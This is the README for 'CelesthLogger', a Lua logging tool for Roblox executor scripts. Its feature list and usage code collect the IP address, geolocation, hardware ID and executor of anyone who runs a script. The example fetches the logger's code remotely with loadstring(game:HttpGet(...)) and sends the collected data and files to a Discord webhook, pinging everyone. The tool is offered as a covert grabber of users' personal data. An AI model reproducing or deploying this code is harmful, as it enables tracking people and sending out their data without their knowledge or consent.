# CelesthLogger

**CelesthLogger** is a Roblox executor-side logging utility that sends detailed webhook logs to Discord.

## 🔧 Features

- IP logging (`https://v4.ident.me`)
- Geo info from `ip-api.com`
- HWID (ClientId)
- Executor detection
- One-time user logging (`stellarium/logged.txt`)
- Cooldown logic (`G_.LastSent`)
- Customizable embed data
- Optional file logging (`:SendFile`)

## 📦 Example Usage

```lua
_G.IpLog = true
_G.GeoLog = true
_G.HwidLog = true
_G.ExecutorLog = true
_G.JobIdLog = true
_G.IgnoreLoggedCheck = false
_G.IgnoreCooldown = false
_G.WebhookCooldown = 60
_G.PingEveryone = true
_G.EmbedTitle = "🚨 Celesth Logger"
_G.EmbedMessage = "User executed your script"
_G.EmbedColor = 16711680
_G.EmbedThumbnail = "https://www.roblox.com/headshot-thumbnail/image?userId="..game.Players.LocalPlayer.UserId.."&width=150&height=150&format=png"

loadstring(game:HttpGet("https://raw.githubusercontent.com/Celesth/celes.wh/main/mainUtils.luau"))()
local Celesth = loadstring(game:HttpGet("https://raw.githubusercontent.com/Celesth/CelesthLogger/main/CelesthLogger.lua"))()

Celesth:Log("https://discord.com/api/webhooks/...")

Celesth:SendFile("https://discord.com/api/webhooks/...", "log.txt", "Executed by "..game.Players.LocalPlayer.Name, "📁 Log attached")
